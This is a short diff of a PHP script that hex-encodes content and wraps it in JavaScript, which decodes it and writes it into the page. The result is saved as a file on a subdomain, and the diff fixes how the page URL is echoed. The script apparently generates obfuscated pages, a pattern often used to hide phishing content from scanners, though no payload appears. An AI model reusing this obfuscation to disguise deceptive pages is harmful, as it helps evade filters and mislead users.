@@ -42,5 +42,5 @@ $hex = bin2hex($decode);
 $script = '<script type="text/javascript">var t ="'.$hex.'"; for (i = 0; i < t.length; i += 2) { document.write(String.fromCharCode(parseInt(t.substr(i, 2), 16))); }</script>';	
 
 file_put_contents($SUBDOMINIO."/links". "/" .$NAMEFILE, $script);
-echo  $PROTOCOLO.$SUBDOMINIO'.'.$DOMAIN.'/'.$NAMEFILE;
+echo  "https://".$SUBDOMINIO.'.'.$DOMAIN.'/'.$NAMEFILE;
 } 
